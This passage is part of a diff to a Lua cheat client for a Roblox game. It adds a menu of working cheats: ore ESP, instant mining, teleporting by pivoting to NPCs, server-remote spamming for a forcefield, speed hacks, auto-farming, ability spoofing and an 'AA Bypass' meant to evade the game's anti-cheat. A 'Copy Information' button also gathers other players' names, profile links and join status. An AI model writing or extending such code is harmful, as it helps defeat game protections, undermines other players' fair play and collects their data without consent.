+                        cheat_client.config.ore_esp = value
+
+                        if value then
+                            cheat_client.ore_esp_objects = cheat_client.ore_esp_objects or {}
+                            for _, object in pairs(ws.Ores:GetChildren()) do
+                                if not cheat_client.ore_esp_objects[object] then
+                                    cheat_client:add_ore_esp(object)
+                                end
+                            end
+
+                            cheat_client.esp_rendering.start_ore_esp()
+                        else
+                            cheat_client.esp_rendering.stop_ore_esp()
+
+                            for ore, esp in pairs(cheat_client.ore_esp_objects or {}) do
+                                if esp and esp.destruct then
+                                    esp:destruct()
+                                end
+                            end
+                            cheat_client.ore_esp_objects = {}
+                        end
+                    end
+                }):AddKeyPicker("OreEspKeybind", {
+                    Default = cheat_client.config.ore_esp_keybind,
+                    Text = "Ore ESP Toggle",
+                    Mode = "Toggle",
+                    SyncToggleState = true,
+                })
+
+                Options.OreEspKeybind:OnChanged(function()
+                    cheat_client.config.ore_esp_keybind = Options.OreEspKeybind.Value
+                end)
+
+                group_ore_esp:AddToggle("mythril_esp", {
+                    Text = "Mythril",
+                    Default = cheat_client.config.mythril_esp,
+                    Callback = function(value)
+                        cheat_client.config.mythril_esp = value
+                    end
+                })
+
+                group_ore_esp:AddToggle("copper_esp", {
+                    Text = "Copper",
+                    Default = cheat_client.config.copper_esp,
+                    Callback = function(value)
+                        cheat_client.config.copper_esp = value
+                    end
+                })
+
+                group_ore_esp:AddToggle("iron_esp", {
+                    Text = "Iron",
+                    Default = cheat_client.config.iron_esp,
+                    Callback = function(value)
+                        cheat_client.config.iron_esp = value
+                    end
+                })
+
+                group_ore_esp:AddToggle("tin_esp", {
+                    Text = "Tin",
+                    Default = cheat_client.config.tin_esp,
+                    Callback = function(value)
+                        cheat_client.config.tin_esp = value
+                    end
+                })
+
+                group_ore_esp:AddSlider("ore_range", {
+                    Text = "Range",
+                    Default = cheat_client.config.ore_range,
+                    Min = 0,
+                    Max = 12000,
+                    Rounding = 1,
+                    Callback = function(value)
+                        cheat_client.config.ore_range = value
+                    end
+                })
+                end
+            end
+
         end
 
-        do -- Exploits
+        do
             local group_character = Tabs.Exploits:AddLeftGroupbox("Character")
             local group_camera = Tabs.Exploits:AddRightGroupbox("Camera")
+            local group_exploits = Tabs.Exploits:AddRightGroupbox("Exploits")
     
-            do -- character
+            do
+                group_character:AddToggle("instant_mine", {
+                    Text = "Instant Mine",
+                    Default = cheat_client.config.instant_mine,
+                    Tooltip = "Need min 5 pickaxes",
+                    Callback = function(value)
+                        cheat_client.config.instant_mine = value
+                    end
+                })
+
+
                 group_character:AddToggle("no_insanity", {
                     Text = "No Insane",
                     Default = cheat_client.config.no_insane,
@@ -5472,37 +8278,230 @@ if game.PlaceId == 100010170789226 then
                         utility:reset();
                     end
                 end)
-            end
 
-            group_camera:AddToggle("invis_cam", {
-                Text = "Invis Cam",
-                Default = cheat_client.config.invis_cam,
-                Callback = function(state)
-                    cheat_client.config.invis_cam = state
-
-                    if state then
-                        plr.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
-                    else
-                        plr.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Zoom
+                group_character:AddButton("Give Mercenary Carry", function()
+                    if plr and plr.Backpack then
+                        Instance.new("Folder", plr.Backpack).Name = "MercenaryCarry"
                     end
-                end
-            })
+                end)
 
-            if game.PlaceId ~= 14341521240 then
-                group_camera:AddToggle("max_zoom", {
-                    Text = "Max Zoom",
-                    Default = cheat_client.config.max_zoom,
+                local forcefield_con
+                group_character:AddToggle("forcefield", {
+                    Text = "Enter Forcefield",
+                    Default = false,
                     Callback = function(state)
-                        cheat_client.config.max_zoom = state
 
                         if state then
-                            plr.CameraMaxZoomDistance = 9e9
+                            if plr.Character then
+                                local function ff()
+                                    join_server:FireServer("hey")
+                                end
+                                ff()
+                                forcefield_con = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function(child)
+                                    ff()
+                                end))
+                            end
                         else
-                            plr.CameraMaxZoomDistance = 50
+                            if forcefield_con then
+                                forcefield_con:Disconnect();
+                                forcefield_con = nil
+                            end
                         end
                     end
                 })
             end
+
+            if game.PlaceId ~= 3541987450 then
+                local selected_inn = "Southern Sanctuary"
+                local inn_locations = {
+                    "Southern Sanctuary",
+                    "Central Sanctuary",
+                    "Castle Sanctuary",
+                    "Wayside Inn",
+                    "Flowerlight Town",
+                    "Renova",
+                    "Oresfall",
+                    "Santorini",
+                    "Scroomville",
+                    "Sleeping Snail"
+                }
+
+                group_exploits:AddDropdown("inn_location", {
+                    Values = inn_locations,
+                    Default = 1,
+                    Multi = false,
+                    Text = "Inn Location",
+                    Tooltip = "Select inn to teleport to",
+                    Callback = function(value)
+                        selected_inn = value
+                    end
+                })
+
+                group_exploits:AddButton("teleport_to_inn", {
+                    Text = "Teleport",
+                    Func = function()
+                        if shared and shared.is_unloading then return end
+                        if not utility then return end
+
+                        task.spawn(function()
+                            if not selected_inn then
+                                library:Notify("No inn selected")
+                                return
+                            end
+
+                            if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                library:Notify("Character not found")
+                                return
+                            end
+
+                            local hrp = plr.Character.HumanoidRootPart
+                            local dialogue_response = (selected_inn == "Flowerlight Town") and "A room, please." or "Sure."
+
+                            local inn_keeper
+                            if selected_inn == "Flowerlight Town" then
+                                inn_keeper = FindFirstChild(ws.NPCs, "Ria")
+                            elseif selected_inn == "Scroomville" then
+                                inn_keeper = FindFirstChild(ws.NPCs, "Fungkeeper")
+                            else
+                                for _, npc in next, ws.NPCs:GetChildren() do
+                                    if npc.Name == "Inn Keeper" and FindFirstChild(npc, "Location") and npc.Location.Value == selected_inn then
+                                        inn_keeper = npc
+                                        break
+                                    end
+                                end
+                            end
+
+                            if not inn_keeper then
+                                library:Notify("Inn keeper not found at " .. selected_inn)
+                                return
+                            end
+
+                            if not FindFirstChild(inn_keeper, "HumanoidRootPart") then
+                                library:Notify("Inn keeper has no HumanoidRootPart")
+                                return
+                            end
+
+                            local elapsed_time = 0
+                            while elapsed_time < 1 and not (shared and shared.is_unloading) do
+                                if plr.Character then
+                                    plr.Character:PivotTo(inn_keeper:GetPivot())
+                                    hrp.Velocity = Vector3.zero
+
+                                    if (hrp.Position - inn_keeper.HumanoidRootPart.Position).Magnitude <= 10 then
+                                        local click_detector = FindFirstChildWhichIsA(inn_keeper, "ClickDetector", true)
+                                        if click_detector then
+                                            fireclickdetector(click_detector)
+                                        end
+                                    end
+
+                                    if dialogue_remote then
+                                        dialogue_remote:FireServer({choice = dialogue_response})
+                                    end
+                                end
+
+                                elapsed_time = elapsed_time + task.wait()
+                            end
+
+                            if plr.Character then
+                                plr.Character:BreakJoints()
+                            end
+
+                            library:Notify("Teleported to " .. selected_inn)
+                        end)
+                    end
+                })
+            end
+
+            group_exploits:AddDivider()
+
+            group_exploits:AddButton("enable_aa_bypass", {
+                Text = "AA Bypass",
+                Tooltip = "EXPERIMENTAL FEATURE",
+                Func = function()
+                    if not plr.Character or not FindFirstChild(plr.Character, "HumanoidRootPart") then
+                        library:Notify("character not found")
+                        return
+                    end
+
+                    local hrp = plr.Character.HumanoidRootPart
+                    local huma = FindFirstChildOfClass(plr.Character, "Humanoid")
+                    local eagle = FindFirstChild(ws.NPCs, "The Eagle")
+
+                    if not eagle or not FindFirstChild(eagle, "HumanoidRootPart") or not FindFirstChild(eagle, "ClickDetector") then
+                        library:Notify("didn't find eagle npc")
+                        return
+                    end
+
+                    task.defer(function()
+                        local noclip_con = utility:Connection(rs.RenderStepped, function()
+                            if not plr.Character or not hrp or not hrp.Parent then return end
+
+                            for i, v in next, plr.Character:GetDescendants() do
+                                if v:IsA("BasePart") then
+                                    v.CanCollide = false
+
+                                    if v ~= hrp then
+                                        v.RotVelocity = Vector3.new(0, 0, 0)
+                                    end
+                                end
+                            end
+
+                            if huma then
+                                huma:SetStateEnabled(5, false)
+                                huma:ChangeState(3)
+                            end
+
+                            if hrp then
+                                local camCFrame = ws.CurrentCamera.CFrame
+                                local lookVector = camCFrame.LookVector
+                                local flatLook = Vector3.new(lookVector.X, 0, lookVector.Z).Unit
+
+                                if flatLook.Magnitude > 0.01 then
+                                    hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + flatLook)
+                                end
+                            end
+                        end)
+
+                        for i = 1, 10 do
+                            if not hrp or not hrp.Parent then break end
+                            hrp.CFrame = eagle.HumanoidRootPart.CFrame
+                            fireclickdetector(eagle.ClickDetector)
+                            task.wait(0.1)
+                        end
+
+                        if noclip_con then
+                            noclip_con:Disconnect()
+                        end
+
+                        if plr.Character then
+                            for _, part in ipairs(plr.Character:GetDescendants()) do
+                                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                                    if part.Name == "Head" or part.Name == "Torso" then
+                                        part.CanCollide = true
+                                    else
+                                        part.CanCollide = false
+                                    end
+                                end
+                            end
+
+                            if huma then
+                                huma:SetStateEnabled(5, true)
+                                huma:ChangeState(5)
+                            end
+                        end
+                    end)
+
+                    library:Notify("AA Bypass active, deactivates when forcefield disappears")
+                end
+            })
+
+            group_character:AddToggle("anti_globus", {
+                Text = "Anti Globus",
+                Default = cheat_client.config.anti_globus,
+                Callback = function(value)
+                    cheat_client.config.anti_globus = value
+                end
+            })
 
             group_character:AddDivider()
 
@@ -5544,7 +8543,7 @@ if game.PlaceId == 100010170789226 then
             })
         end
 
-        do -- Movement
+        do
             local group_flight = Tabs.Movement:AddLeftGroupbox("Flight")
 
             group_flight:AddToggle("flight", {
@@ -5678,11 +8677,46 @@ if game.PlaceId == 100010170789226 then
                 end)
             end
 
-            -- CERESIAN FLY
         end
-    
-        do -- Automation
+
+        do
+            local group_movement = Tabs.Movement:AddRightGroupbox("Movement")
+
+            group_movement:AddToggle("speed_boost", {
+                Text = "SpeedBoost",
+                Default = cheat_client.config.speed_boost or false,
+                Callback = function(value)
+                    cheat_client.config.speed_boost = value
+                end
+            })
+
+            local last_speed_notif = 0
+            group_movement:AddSlider("speed_boost_value", {
+                Text = "Speed",
+                Default = cheat_client.config.speed_boost_value or 16,
+                Min = 0.1,
+                Max = 250,
+                Rounding = 1,
+                Compact = false,
+                Callback = function(value)
+                    local blatant_mode_enabled = Toggles.blatant_mode and Toggles.blatant_mode.Value
+                    if not blatant_mode_enabled and value > 20 then
+                        Options.speed_boost_value:SetValue(20)
+                        local now = tick()
+                        if now - last_speed_notif > 2 then
+                            library:Notify("Speed limited to 20 (blatant mode disabled)")
+                            last_speed_notif = now
+                        end
+                        return
+                    end
+                    cheat_client.config.speed_boost_value = value
+                end
+            })
+        end
+
+        do
             local group_general = Tabs.Automation:AddLeftGroupbox("General")
+            local group_farm = Tabs.Automation:AddRightGroupbox("Farming")
 
             group_general:AddToggle("auto_dialogue", {
                 Text = "Auto Dialogue",
@@ -5726,7 +8760,245 @@ if game.PlaceId == 100010170789226 then
                 end
             end)
 
+            group_farm:AddToggle("day_farm", {
+                Text = "Day Farm",
+                Default = false,
+                Callback = function(state)
+                    cheat_client:day_farm(state)
+                end
+            })
+
+            group_farm:AddToggle("day_goal_kick", {
+                Text = "Kick on Day",
+                Default = false,
+                Callback = function(value)
+                end
+            })
+
+            group_farm:AddToggle("no_kick", {
+                Text = "No Kick 23 Mode",
+                Default = false,
+                Callback = function(value)
+                end
+            })
+
+            group_farm:AddSlider("day_farm_range", {
+                Text = "Range",
+                Default = 500,
+                Min = 100,
+                Max = 2500,
+                Rounding = 1,
+                Callback = function(value)
+                end
+            })
+
+            local days = utility:getPlayerDays()
+            group_farm:AddInput("day_goal", {
+                Text = "Target Day",
+                Default = "",
+                Numeric = true,
+                Finished = false,
+                Placeholder = tostring(days + 1),
+                Callback = function(value)
+                    local num = tonumber(value)
+                    if num and num >= 0 then
+                        num = math.floor(num)
+                    else
+                        library:Notify("Target Day must be a valid number!", 3)
+                    end
+                end
+            })
+
+            group_farm:AddDivider()
+
+            group_farm:AddToggle("loop_orderly", {
+                Text = "Loop Gain Orderly",
+                Default = false,
+                Callback = function(value)
+                end
+            })
+
+            group_farm:AddToggle("train_climb", {
+                Text = "Train Climb",
+                Default = false,
+                Callback = function(value)
+                end
+            })
+
+            group_farm:AddDivider()
+
+            group_farm:AddToggle("SnapTrain", {
+                Text = "Snap Train",
+                Default = false,
+                Callback = function(value)
+                end
+            })
+
+            group_farm:AddToggle("AutoCharge", {
+                Text = "Auto Mana Charge",
+                Default = cheat_client.config.auto_charge,
+                Callback = function(value)
+                    cheat_client.config.auto_charge = value
+                end
+            })
+
+            group_farm:AddSlider("AutoChargeThreshold", {
+                Text = "Charge At Percent",
+                Default = cheat_client.config.auto_charge_threshold,
+                Min = 1,
+                Max = 100,
+                Rounding = 1,
+                Callback = function(value)
+                    cheat_client.config.auto_charge_threshold = value
+                end
+            })
+
+            local group_automation = Tabs.Automation:AddRightGroupbox("Automation")
             local group_auto_pickup = Tabs.Automation:AddLeftGroupbox("Auto Pickup")
+
+            do
+                group_automation:AddDropdown("potions", {
+                    Text = "Potions",
+                    Values = {"Health Potion", "Tespian Elixir", "Feather Feet", "Fire Protection", "Kingsbane", "Lordsbane", "Silver Sun", "Switch Witch"},
+                    Default = "Health Potion",
+                    Callback = function(value)
+                    end
+                })
+
+                group_automation:AddDropdown("weapons", {
+                    Text = "Weapons",
+                    Values = {"Mythril Dagger", "Mythril Sword", "Mythril Spear", "Steel Dagger", "Steel Sword", "Steel Spear", "Bronze Dagger", "Bronze Sword", "Bronze Spear"},
+                    Default = "Mythril Dagger",
+                    Callback = function(value)
+                    end
+                })
+
+                group_automation:AddToggle("auto_potion", {
+                    Text = "Auto Potion",
+                    Default = false,
+                    Callback = function(state)
+                        auto_pot_active = state
+                        if auto_pot_active then
+                            task.spawn(function()
+                                while utility and auto_pot_active and shared and not shared.is_unloading do
+                                    local success = false
+                                    if Options and Options.potions and Options.potions.Value then
+                                        success = utility:craft('Alchemy', Options.potions.Value)
+                                    end
+
+                                    if not success then
+                                        auto_pot_active = false
+                                        if Toggles and Toggles.auto_potion then
+                                            Toggles.auto_potion:SetValue(false)
+                                        end
+                                        break
+                                    end
+                                end
+                            end)
+                        else
+                            auto_pot_active = false
+                        end
+                    end
+                })
+            end
+
+            do
+                group_automation:AddToggle("auto_craft", {
+                    Text = "Auto Craft",
+                    Default = false,
+                    Callback = function(state)
+                        auto_craft_active = state
+                        if auto_craft_active then
+                            task.spawn(function()
+                                while utility and auto_craft_active and shared and not shared.is_unloading do
+                                    local success = false
+                                    if Options and Options.weapons and Options.weapons.Value then
+                                        success = utility:craft('Smithing', Options.weapons.Value)
+                                    end
+
+                                    if not success then
+                                        auto_craft_active = false
+                                        if Toggles and Toggles.auto_craft then
+                                            Toggles.auto_craft:SetValue(false)
+                                        end
+                                        break
+                                    end
+                                end
+                            end)
+                        else
+                            auto_craft_active = false
+                        end
+                    end
+                })
+            end
+
+            do
+                group_automation:AddSlider("auto_craft_delay", {
+                    Text = "Auto Craft Delay",
+                    Default = cheat_client.config.auto_craft_delay,
+                    Min = 0.1,
+                    Max = 5,
+                    Rounding = 2,
+                    Compact = false,
+                    Suffix = "s",
+                    Callback = function(value)
+                        cheat_client.config.auto_craft_delay = value
+                    end
+                })
+            end
+
+            group_auto_pickup:AddToggle("auto_trinket", {
+                Text = "Auto Trinket",
+                Default = cheat_client.config.auto_trinket,
+                Callback = function(value)
+                    cheat_client.config.auto_trinket = value
+                    if value then
+                        if cheat_client.start_auto_trinket_rendering then
+                            cheat_client.start_auto_trinket_rendering()
+                        end
+                    else
+                        if cheat_client.stop_auto_trinket_rendering then
+                            cheat_client.stop_auto_trinket_rendering()
+                        end
+                    end
+                end
+            }):AddKeyPicker("AutoTrinketPickupKeybind", {
+                Default = cheat_client.config.auto_trinket_keybind,
+                Text = "Auto Trinket Toggle",
+                Mode = "Toggle",
+                SyncToggleState = true,
+            })
+
+            Options.AutoTrinketPickupKeybind:OnChanged(function()
+                cheat_client.config.auto_trinket_keybind = Options.AutoTrinketPickupKeybind.Value
+            end)
+
+            group_auto_pickup:AddToggle("auto_ingredient", {
+                Text = "Auto Ingredient",
+                Default = cheat_client.config.auto_ingredient,
+                Callback = function(value)
+                    cheat_client.config.auto_ingredient = value
+                    if value then
+                        if cheat_client.start_auto_ingredient_rendering then
+                            cheat_client.start_auto_ingredient_rendering()
+                        end
+                    else
+                        if cheat_client.stop_auto_ingredient_rendering then
+                            cheat_client.stop_auto_ingredient_rendering()
+                        end
+                    end
+                end
+            }):AddKeyPicker("AutoIngredientPickupKeybind", {
+                Default = cheat_client.config.auto_ingredient_keybind,
+                Text = "Auto Ingredient Toggle",
+                Mode = "Toggle",
+                SyncToggleState = true,
+            })
+
+            Options.AutoIngredientPickupKeybind:OnChanged(function()
+                cheat_client.config.auto_ingredient_keybind = Options.AutoIngredientPickupKeybind.Value
+            end)
+
             group_auto_pickup:AddToggle("auto_weapon", {
                 Text = "Auto Weapon",
                 Default = cheat_client.config.auto_weapon,
@@ -5743,9 +9015,118 @@ if game.PlaceId == 100010170789226 then
             Options.AutoWeaponKeybind:OnChanged(function()
                 cheat_client.config.auto_weapon_keybind = Options.AutoWeaponKeybind.Value
             end)
+
+            group_auto_pickup:AddToggle("auto_resurrection", {
+                Text = "Auto Resurrection",
+                Default = cheat_client.config.auto_resurrection,
+                Callback = function(value)
+                    cheat_client.config.auto_resurrection = value
+                end
+            })
+
+            group_auto_pickup:AddDivider()
+
+            group_auto_pickup:AddToggle("auto_bag", {
+                Text = "Auto Bag",
+                Default = cheat_client.config.auto_bag,
+                Callback = function(value)
+                    cheat_client.config.auto_bag = value
+
+                    if value then
+                        if cheat_client.start_auto_bag then
+                            cheat_client.start_auto_bag()
+                        end
+                    else
+                        if cheat_client.stop_auto_bag then
+                            cheat_client.stop_auto_bag()
+                        end
+                    end
+
+                    if Toggles.show_bag_range then
+                        Toggles.show_bag_range:SetValue(value)
+                    end
+                end
+            }):AddKeyPicker("AutoBagKeybind", {
+                Default = cheat_client.config.auto_bag_keybind,
+                Text = "Auto Bag Toggle",
+                Mode = "Toggle",
+                SyncToggleState = true,
+            })
+
+            Options.AutoBagKeybind:OnChanged(function()
+                cheat_client.config.auto_bag_keybind = Options.AutoBagKeybind.Value
+            end)
+
+            group_auto_pickup:AddSlider("bag_range", {
+                Text = "Range",
+                Default = cheat_client.config.bag_range,
+                Min = 1,
+                Max = 80,
+                Rounding = 1,
+                Callback = function(value)
+                    cheat_client.config.bag_range = value
+                    if cheat_client.bag_range_hitbox and cheat_client.bag_range_hitbox_visible then
+                        cheat_client.bag_range_hitbox.Size = Vector3.new(0.2, value * 2, value * 2)
+                    end
+                end
+            })
+
+            cheat_client.bag_range_hitbox = nil
+            cheat_client.bag_range_hitbox_visible = false
+            cheat_client.bag_range_hitbox_connection = nil
+
+            group_auto_pickup:AddToggle("show_bag_range", {
+                Text = "Show Range Hitbox",
+                Default = cheat_client.config.show_bag_range,
+                Callback = function(value)
+                    cheat_client.bag_range_hitbox_visible = value
+
+                    if value then
+                        if not cheat_client.bag_range_hitbox then
+                            local disc = Instance.new("Part")
+                            disc.Shape = Enum.PartType.Cylinder
+                            local range = (Options and Options.bag_range and Options.bag_range.Value) or cheat_client.config.bag_range
+                            disc.Size = Vector3.new(0.2, range * 2, range * 2)
+                            disc.Anchored = true
+                            disc.CanCollide = false
+                            disc.Material = Enum.Material.Neon
+                            disc.Color = Color3.fromRGB(80, 200, 120)
+                            disc.Transparency = 0.85
+                            disc.Name = "BagRangeDisc"
+                            disc.Parent = workspace
+                            cheat_client.bag_range_hitbox = disc
+                        end
+
+                        if cheat_client.bag_range_hitbox_connection then
+                            cheat_client.bag_range_hitbox_connection:Disconnect()
+                        end
+
+                        cheat_client.bag_range_hitbox_connection = utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
+                            if plr.Character and FindFirstChild(plr.Character, "HumanoidRootPart") then
+                                if cheat_client.bag_range_hitbox then
+                                    local hrp = plr.Character.HumanoidRootPart
+                                    local groundPos = Vector3.new(hrp.Position.X, hrp.Position.Y - 1.5, hrp.Position.Z)
+                                    cheat_client.bag_range_hitbox.CFrame = CFrame.new(groundPos) * CFrame.Angles(0, 0, math.rad(90))
+                                end
+                            end
+                        end))
+                    else
+                        if cheat_client.bag_range_hitbox then
+                            cheat_client.bag_range_hitbox:Destroy()
+                            cheat_client.bag_range_hitbox = nil
+                        end
+
+                        if cheat_client.bag_range_hitbox_connection then
+                            cheat_client.bag_range_hitbox_connection:Disconnect()
+                            cheat_client.bag_range_hitbox_connection = nil
+                        end
+                    end
+                end
+            })
+
         end
         
-        do -- World
+        do
             local group_world = Tabs.World:AddLeftGroupbox("World Settings")
                 
             group_world:AddToggle("freecam", {
@@ -5798,7 +9179,7 @@ if game.PlaceId == 100010170789226 then
 
             group_world:AddDivider()
             
-            do -- No Kill Bricks
+            do
                 local function killbrick(state, container)
                     for _, v in next, container:GetChildren() do
                         if v:IsA("BasePart") and FindFirstChild(v, "TouchInterest") and not (cheat_client.safe_bricks[v.Name] or cheat_client.must_touch[v.BrickColor.Number]) then
@@ -5808,7 +9189,9 @@ if game.PlaceId == 100010170789226 then
                 end
 
                 local container
-                if game.PlaceId == 100010170789226 then
+                if game.PlaceId == 5208655184 then
+                    container = FindFirstChild(ws, "Map")
+                elseif game.PlaceId == 3541987450 then
                     container = ws
                 end
 
@@ -5831,7 +9214,40 @@ if game.PlaceId == 100010170789226 then
                 end
             })
 
-            do -- Textures
+            do
+                local function mob_trigger(state)
+                    local monsters = FindFirstChild(workspace, "MonstersSpawns") or FindFirstChild(workspace, "MonsterSpawns")
+                    if monsters and FindFirstChild(monsters, "Triggers") then
+                        for _, obj in ipairs(monsters.Triggers:GetDescendants()) do
+                            if obj and obj.ClassName == "Part" then
+                                pcall(function()
+                                    obj.CanTouch = not state
+                                end)
+                            end
+                        end
+                    end
+                end
+
+                group_world:AddToggle("no_mob_trigger", {
+                    Text = "No Mob Trigger",
+                    Default = cheat_client.config.no_mob_trigger,
+                    Callback = function(state)
+                        cheat_client.config.no_mob_trigger = state
+                        mob_trigger(state)
+                    end
+                })
+            end
+
+            group_world:AddToggle("temperature_lock", {
+                Text = "Temperature Lock",
+                Default = cheat_client.config.temperature_lock,
+                Tooltip = "!!! Disables trinkets from spawning",
+                Callback = function(value)
+                    cheat_client.config.temperature_lock = value
+                end
+            })
+
+            do
                 local texture_connections = {}
                 local blacklisted_containers = {workspace.Thrown}
 
@@ -5926,7 +9342,7 @@ if game.PlaceId == 100010170789226 then
 
             group_world:AddDivider()
 
-            do -- Proximity Notifier
+            do
                 group_world:AddToggle("proximity_notifier", {
                     Text = "Proximity Notifier",
                     Default = cheat_client.config.proximity_notifier
@@ -5967,7 +9383,7 @@ if game.PlaceId == 100010170789226 then
 
             local group_environment = Tabs.World:AddRightGroupbox("Environment")
 
-            do -- Environment
+            do
                 group_environment:AddToggle("fullbright", {
                     Text = "Fullbright",
                     Default = cheat_client.config.fullbright,
@@ -5980,7 +9396,7 @@ if game.PlaceId == 100010170789226 then
                             local color = Color3.new(brightness_multiplier, brightness_multiplier, brightness_multiplier)
                             lit.Ambient = color
                             lit.OutdoorAmbient = color
-                            lit.Brightness = 1 + (brightness_multiplier * 2) -- Range: 1-3
+                            lit.Brightness = 1 + (brightness_multiplier * 2)
                         else
                             lit.areacolor.Enabled = true
                             lit.Brightness = 1
@@ -6020,7 +9436,7 @@ if game.PlaceId == 100010170789226 then
 
                             lit.Ambient = color
                             lit.OutdoorAmbient = color
-                            lit.Brightness = 1 + (brightness_multiplier * 2) -- Range: 1-3
+                            lit.Brightness = 1 + (brightness_multiplier * 2)
                         end
                     end
                 })
@@ -6070,7 +9486,6 @@ if game.PlaceId == 100010170789226 then
                     Rounding = 1,
                     Callback = function(value)
                         cheat_client.config.clock_time = value
-                        -- Update time immediately if change_time is enabled
                         if Toggles.change_time and Toggles.change_time.Value then
                             lit.ClockTime = value
                         end
@@ -6122,7 +9537,7 @@ if game.PlaceId == 100010170789226 then
         end
 
 
-        do -- Misc
+        do
             local group_misc = Tabs.Misc:AddLeftGroupbox("Misc Settings")
 
             local function wait_danger()
@@ -6130,6 +9545,67 @@ if game.PlaceId == 100010170789226 then
                     rs.Heartbeat:Wait()
                 end
             end
+
+            if not LPH_OBFUSCATED then
+                group_misc:AddToggle("spoof_the_soul", {
+                    Text = "Spoof The Soul",
+                    Default = cheat_client.config.the_soul,
+                    Callback = function(value)
+                        cheat_client.config.the_soul = value
+                    end
+                })
+
+                group_misc:AddToggle("spoof_acrobat", {
+                    Text = "Spoof Double Jump",
+                    Default = cheat_client.config.double_jump,
+                    Callback = function(value)
+                        cheat_client.config.double_jump = value
+                    end
+                })
+            end
+            
+            group_misc:AddButton({
+                Text = "Copy Information",
+                Func = function()
+                    local result = ""
+                    local with_links = {}
+                    local without_links = {}
+
+                    local server_name, server_region = get_server_info()
+                    if server_name ~= "" and server_region ~= "" then
+                        result = server_name .. " " .. game.JobId .. " [" .. server_region .. "]\n\n"
+                    end
+
+                    for _, player in ipairs(plrs:GetPlayers()) do
+                        if player ~= plr then
+                            local displayName = cheat_client:get_name(player)
+                            local profileLink = "<https://www.roblox.com/users/" .. tostring(player.UserId) .. "/profile>"
+
+                            local joinable = utility:get_presence(player.UserId)
+                            if joinable then
+                                with_links[#with_links + 1] = displayName .. " [" .. player.Name .. "] " .. profileLink
+                            else
+                                without_links[#without_links + 1] = displayName .. " [" .. player.Name .. "]"
+                            end
+                        end
+                    end
+
+                    if #with_links > 0 then
+                        result = result .. table.concat(with_links, "\n")
+
+                        if #without_links > 0 then
+                            result = result .. "\n"
+                        end
+                    end
+
+                    if #without_links > 0 then
+                        result = result .. table.concat(without_links, "\n")
+                    end
+
+                    setclipboard(result)
+                end
+            })
+
 
             group_misc:AddButton({
                 Text = "Unblock All",
@@ -6175,20 +9651,515 @@ if game.PlaceId == 100010170789226 then
                 end
             })
 
+            local auto_idol_running = false
+            local auto_chest_running = false
+            local auto_chest_dialog_connection = nil
+            local auto_chest_discovery_connections = {}
+
+            local function find_inventory_tool(name)
+                if plr.Backpack then
+                    for _, item in ipairs(plr.Backpack:GetChildren()) do
+                        if item:IsA("Tool") and item.Name == name then
+                            return item
+                        end
+                    end
+                end
+
+                if plr.Character then
+                    for _, item in ipairs(plr.Character:GetChildren()) do
+                        if item:IsA("Tool") and item.Name == name then
+                            return item
+                        end
+                    end
+                end
+            end
+
+            local function get_inventory_quantity(name)
+                local total = 0
+
+                local function count_item(item)
+                    if item:IsA("Tool") and item.Name == name then
+                        local quantity = FindFirstChild(item, "Quantity")
+                        if quantity and quantity:IsA("IntValue") then
+                            total = total + quantity.Value
+                        else
+                            total = total + 1
+                        end
+                    end
+                end
+
+                if plr.Backpack then
+                    for _, item in ipairs(plr.Backpack:GetChildren()) do
+                        count_item(item)
+                    end
+                end
+
+                if plr.Character then
+                    for _, item in ipairs(plr.Character:GetChildren()) do
+                        count_item(item)
+                    end
+                end
+
+                return total
+            end
+
+            local function click_current_tool()
+                if vim then
+                    pcall(function()
+                        vim:SendMouseButtonEvent(0, 0, 0, true, game, 1)
+                        task.wait(math.random(1, 15) / 1000)
+                        vim:SendMouseButtonEvent(0, 0, 0, false, game, 1)
+                    end)
+                end
+
+                if utility and utility.LeftClick then
+                    pcall(function()
+                        utility:LeftClick()
+                    end)
+                end
+            end
+
+            local function equip_and_click_tool(tool)
+                local character = plr.Character
+                local humanoid = character and FindFirstChildOfClass(character, "Humanoid")
+                if not character or not humanoid or not tool then
+                    return false
+                end
+
+                if plr.Backpack and tool.Parent == plr.Backpack then
+                    pcall(function()
+                        humanoid:EquipTool(tool)
+                    end)
+                end
+
+                local start_time = tick()
+                while tool.Parent ~= character and tick() - start_time < 2 and Toggles.AutoIdolOfWar and Toggles.AutoIdolOfWar.Value do
+                    task.wait(0.05)
+                end
+
+                if tool.Parent ~= character then
+                    return false
+                end
+
+                pcall(function()
+                    tool:Activate()
+                end)
+                click_current_tool()
+                return true
+            end
+
+            local function get_war_chest()
+                local npcs = FindFirstChild(ws, "NPCs")
+                if not npcs then
+                    return nil
+                end
+
+                return FindFirstChild(npcs, "War Chest", true)
+            end
+
+            local function get_interact_part(instance)
+                if not instance then
+                    return nil
+                end
+
+                if instance:IsA("BasePart") then
+                    return instance
+                end
+
+                return FindFirstChild(instance, "HumanoidRootPart")
+                    or FindFirstChild(instance, "Head")
+                    or instance.PrimaryPart
+                    or FindFirstChildWhichIsA(instance, "BasePart", true)
+            end
+
+            local function is_near_war_chest(chest, click_detector)
+                local character = plr.Character
+                local root = character and FindFirstChild(character, "HumanoidRootPart")
+                local part = get_interact_part(chest)
+                if not root or not part then
+                    return false
+                end
+
+                local max_distance = click_detector and click_detector.MaxActivationDistance or 20
+                return (root.Position - part.Position).Magnitude <= math.max(max_distance, 20) + 3
+            end
+
+            local function disconnect_auto_chest_dialog()
+                if auto_chest_dialog_connection then
+                    pcall(function()
+                        auto_chest_dialog_connection:Disconnect()
+                    end)
+                    auto_chest_dialog_connection = nil
+                end
+
+                for _, connection in ipairs(auto_chest_discovery_connections) do
+                    pcall(function()
+                        connection:Disconnect()
+                    end)
+                end
+                auto_chest_discovery_connections = {}
+            end
+
+            local function handle_auto_chest_dialog(dialogData)
+                if not (auto_chest_running and Toggles.AutoChestOpen and Toggles.AutoChestOpen.Value) then
+                    return
+                end
+
+                if typeof(dialogData) ~= "table" or not dialogData.choices then
+                    return
+                end
+
+                for _, choice in ipairs(dialogData.choices) do
+                    if choice == "Open (30 WP)" then
+                        task.wait(0.05)
+                        pcall(function()
+                            dialogue_remote:FireServer({choice = choice})
+                        end)
+                        return
+                    end
+                end
+            end
+
+            local function ensure_auto_chest_dialog()
+                if auto_chest_dialog_connection then
+                    return
+                end
+
